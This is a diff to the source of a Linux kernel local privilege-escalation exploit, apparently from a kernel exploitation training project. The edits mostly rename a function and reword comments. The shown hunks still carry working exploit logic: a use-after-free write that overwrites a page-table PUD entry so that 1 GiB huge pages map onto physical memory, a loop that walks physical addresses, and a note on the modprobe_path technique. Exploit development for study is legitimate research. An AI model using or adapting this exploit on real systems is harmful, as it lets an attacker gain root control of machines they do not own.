@@ -13,7 +13,7 @@
  *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
- *  2) Dump the first 16 bytes of kernel_text in case the predefined KERNEL_PATTERNS_STR is not working.
+ *  2) Ensure that KERNEL_PATTERNS_STR contains the first bytes of _text of your kernel
  */
 
 #define _GNU_SOURCE
@@ -117,7 +117,7 @@ int act(int act_fd, int code, int n, char *args)
 /* From include/linux/huge_mm.h */
 #define PUD_SIZE (1UL << 30)
 
-/* Page table bits: HUGE | Dirty | Accessed | User | Write | Present */
+/* Page table bits: Huge | Dirty | Accessed | User | Write | Present */
 #define PT_BITS 0xe7lu
 
 #define PGD_N 64
@@ -183,15 +183,15 @@ int flush_tlb(void *addr, size_t len)
 }
 
 /*
-* Overwrite one entry in PUD, which reclaimed the UAF memory.
-* It will point to the 1 GiB huge page
-* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16.
-*/
-int UAF_write(unsigned long phys_addr, long uaf_n, int act_fd)
+ * Overwrite one entry in PUD, which reclaimed the UAF memory.
+ * This entry will point to a GiB huge page.
+ */
+int uaf_write(unsigned long phys_addr, long uaf_n, int act_fd)
 {
 	char act_args[DRILL_ACT_SIZE] = { 0 };
 	int ret = EXIT_FAILURE;
 
+	/* DRILL_ACT_SAVE_VAL with 0 as 2nd argument starts at the offset 16 */
 	snprintf(act_args, sizeof(act_args), "0x%lx 0", phys_addr);
 	printf("[!] writing phys addreses to the PUD: %lx - %lx\n", phys_addr - PT_BITS,
 	       phys_addr - PT_BITS + PUD_SIZE);
@@ -527,7 +527,7 @@ int main(void)
 
 	/* choose "0x0 + flags" as starting adress */
 	phys_addr = PT_BITS;
-	ret = UAF_write(phys_addr, uaf_n, act_fd);
+	ret = uaf_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
@@ -556,7 +556,7 @@ int main(void)
 				break;
 
 			phys_addr += PUD_SIZE;
-			ret = UAF_write(phys_addr, uaf_n, act_fd);
+			ret = uaf_write(phys_addr, uaf_n, act_fd);
 			if (ret == EXIT_FAILURE)
 				goto end;
 		}
